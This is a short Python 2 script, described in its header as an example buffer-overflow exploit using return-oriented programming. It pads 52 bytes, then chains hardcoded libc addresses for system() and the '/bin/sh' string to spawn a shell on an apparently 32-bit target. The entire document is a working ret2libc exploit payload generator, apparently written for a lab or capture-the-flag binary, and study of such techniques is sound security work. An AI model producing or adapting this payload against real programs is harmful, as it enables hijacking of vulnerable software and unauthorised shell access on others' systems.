'''

Description: Example of exploit code for BoF ROP (Return-Oriented Programming)
Author: k14d1u5
Date: 19/04/2025

'''

#!/usr/bin/python
import struct
#def addr(x):
	#return struct.pack('<I', x)
 
junk = "A" * 52
ret = struct.pack('<I', 0xb7e19000 + 0x0003ada0)	# system address
# fake = struct.pack('<I', 0xb7e19000 + 0x0002e9d0)	# exit return address. This is not necessary, I can use any fake address here
fake = struct.pack('<I', 0xb7e19000 + 0x11111111)	# fake return address. Pay attention: I must to stay in the Integer range value!
binsh_str = struct.pack('<I', 0xb7e19000 + 0x0015ba0b)	# /bin/sh address in libc library
# zero = b"\x00\x00\x00\x00"	# Null byte / address


payload = junk + ret + fake + binsh_str # + binsh_str + zero
print payload
